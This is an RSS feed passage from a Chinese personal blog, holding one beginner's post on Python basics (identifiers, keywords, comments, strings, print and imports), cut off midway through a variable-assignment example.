<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>逐梦 • Posts by &#34;学习&#34; tag</title>
        <link>https://0xdadream.github.io</link>
        <description>Welcome to my blog</description>
        <language>zh-CN</language>
        <pubDate>Sun, 10 Oct 2021 02:11:00 +0800</pubDate>
        <lastBuildDate>Sun, 10 Oct 2021 02:11:00 +0800</lastBuildDate>
        <category>tip</category>
        <category>安装</category>
        <category>re</category>
        <category>工具</category>
        <category>Java</category>
        <category>linux</category>
        <category>教程</category>
        <category>web</category>
        <category>wp</category>
        <category>攻防世界</category>
        <category>BUUCTF</category>
        <category>windows</category>
        <category>server</category>
        <category>bug</category>
        <category>环境</category>
        <category>sql</category>
        <category>代码审计</category>
        <category>漏洞复现</category>
        <category>tips</category>
        <category>git</category>
        <category>java</category>
        <category>学习</category>
        <category>命令</category>
        <category>tools</category>
        <category>文件上传</category>
        <category>php</category>
        <category>python</category>
        <category>汇编</category>
        <category>i春秋</category>
        <item>
            <guid isPermalink="true">https://0xdadream.github.io/2021/10/10/python-study/</guid>
            <title>python学习</title>
            <link>https://0xdadream.github.io/2021/10/10/python-study/</link>
            <category>学习</category>
            <category>python</category>
            <pubDate>Sun, 10 Oct 2021 02:11:00 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;python学习&#34;&gt;&lt;a href=&#34;#python学习&#34; class=&#34;headerlink&#34; title=&#34;python学习&#34;&gt;&lt;/a&gt;python学习&lt;/h1&gt;&lt;h2 id=&#34;基础语法&#34;&gt;&lt;a href=&#34;#基础语法&#34; class=&#34;headerlink&#34; title=&#34;基础语法&#34;&gt;&lt;/a&gt;基础语法&lt;/h2&gt;&lt;h3 id=&#34;标识符&#34;&gt;&lt;a href=&#34;#标识符&#34; class=&#34;headerlink&#34; title=&#34;标识符&#34;&gt;&lt;/a&gt;标识符&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;首字母必须是字母或者下划线&lt;code&gt;_&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;其他部分由字母、数字、下划线组成&lt;/li&gt;
&lt;li&gt;大小写敏感&lt;/li&gt;
&lt;li&gt;python3 可中文也可非ASCII标识符&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;python保留字&#34;&gt;&lt;a href=&#34;#python保留字&#34; class=&#34;headerlink&#34; title=&#34;python保留字&#34;&gt;&lt;/a&gt;python保留字&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; keyword
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;keyword&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;kwlist&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;False&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;None&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;True&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;and&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;as&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;assert&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;async&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;await&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;break&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;class&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;continue&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;def&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;del&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;elif&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;else&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;except&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;finally&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;for&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;from&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;global&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;if&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;import&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;in&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;is&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;lambda&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;nonlocal&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;not&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;or&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;pass&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;raise&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;return&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;try&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;while&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;with&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;yield&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;注释&#34;&gt;&lt;a href=&#34;#注释&#34; class=&#34;headerlink&#34; title=&#34;注释&#34;&gt;&lt;/a&gt;注释&lt;/h3&gt;&lt;p&gt;python中&lt;code&gt;&#39;&lt;/code&gt;和&lt;code&gt;&#34;&lt;/code&gt;一样&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-none&#34;&gt;&lt;code class=&#34;language-none&#34;&gt;#单行注释

&#39;&#39;&#39;
多行注释
&#39;&#39;&#39;

&#34;&#34;&#34;
多行注释
&#34;&#34;&#34;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;缩进&#34;&gt;&lt;a href=&#34;#缩进&#34; class=&#34;headerlink&#34; title=&#34;缩进&#34;&gt;&lt;/a&gt;缩进&lt;/h3&gt;&lt;p&gt;python不使用大括号，使用缩进对齐&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; expression &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    XXX
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    XXX&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;多行连接&#34;&gt;&lt;a href=&#34;#多行连接&#34; class=&#34;headerlink&#34; title=&#34;多行连接&#34;&gt;&lt;/a&gt;多行连接&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;var &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; \
	 &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; \
    &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;#6&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;数字类型&#34;&gt;&lt;a href=&#34;#数字类型&#34; class=&#34;headerlink&#34; title=&#34;数字类型&#34;&gt;&lt;/a&gt;数字类型&lt;/h3&gt;&lt;p&gt;python中数字有四种类型：整数、布尔型、浮点数和复数&lt;/p&gt;
&lt;h3 id=&#34;字符串&#34;&gt;&lt;a href=&#34;#字符串&#34; class=&#34;headerlink&#34; title=&#34;字符串&#34;&gt;&lt;/a&gt;字符串&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;python中单引号、双引号使用完全相同&lt;/li&gt;
&lt;li&gt;转义字符&lt;code&gt;\&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;r&#39;test\ntest&#39;&lt;/code&gt;，&lt;code&gt;r&lt;/code&gt;可以使&lt;code&gt;\n&lt;/code&gt;不转义&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#34;this &#34; &#34;is &#34; &#34;string&#34;&lt;/code&gt;输出&lt;code&gt;this is string&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;+&lt;/code&gt;运算符连接字符，&lt;code&gt;*&lt;/code&gt;运算符重复字符&lt;/li&gt;
&lt;li&gt;检索从左到右从0开始，从右到左从-1开始&lt;/li&gt;
&lt;li&gt;一个字符就是一个长度为1的字符串&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;var &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;this &#34;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;is &#34;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;string&#34;&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# this is string&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# this is stringthis is string&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;111&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# this is string111&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ssss\nsssss&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# ssss&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# sssss&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;r&#34;ssss\nssss&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# ssss\nssss&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# this is string&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# this is string&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# this is strin&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# ti ssrn&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
this is string
this is stringthis is string
this is string111
ssss
sssss
ssss\nssss
this is string
this is string
this is strin
ti ssrn
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;一行多条语句&#34;&gt;&lt;a href=&#34;#一行多条语句&#34; class=&#34;headerlink&#34; title=&#34;一行多条语句&#34;&gt;&lt;/a&gt;一行多条语句&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; x &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;stdout&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;x &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;\n&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
test

&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;多个语句组成代码组&#34;&gt;&lt;a href=&#34;#多个语句组成代码组&#34; class=&#34;headerlink&#34; title=&#34;多个语句组成代码组&#34;&gt;&lt;/a&gt;多个语句组成代码组&lt;/h3&gt;&lt;p&gt;首行以关键字开始，以冒号( : )结束，该行之后的一行或多行代码构成代码组&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; expression &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; 
   suite
&lt;span class=&#34;token keyword&#34;&gt;elif&lt;/span&gt; expression &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; 
   suite 
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; 
   suite&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;输出&#34;&gt;&lt;a href=&#34;#输出&#34; class=&#34;headerlink&#34; title=&#34;输出&#34;&gt;&lt;/a&gt;输出&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;var &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 换行输出&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;---------&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 不换行输出&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; end&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 以空格分隔&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; end&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34; &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
test
1
---------
test 1 

&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;导入模块&#34;&gt;&lt;a href=&#34;#导入模块&#34; class=&#34;headerlink&#34; title=&#34;导入模块&#34;&gt;&lt;/a&gt;导入模块&lt;/h3&gt;&lt;p&gt;在 python 用 &lt;strong&gt;import&lt;/strong&gt; 或者 &lt;strong&gt;from…import&lt;/strong&gt; 来导入相应的模块&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; sys
&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sys &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; argv&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;path&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;数据类型&#34;&gt;&lt;a href=&#34;#数据类型&#34; class=&#34;headerlink&#34; title=&#34;数据类型&#34;&gt;&lt;/a&gt;数据类型&lt;/h2&gt;&lt;p&gt;python的变量就是对象&lt;/p&gt;
&lt;p&gt;python变量直接赋值，不需要声明&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1.2&lt;/span&gt;
c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;多个变量赋值&#34;&gt;&lt;a href=&#34;#多个变量赋值&#34; class=&#34;headerlink&#34; title=&#34;多个变量赋值&#34;&gt;&lt;/a&gt;多个变量赋值&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;c &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
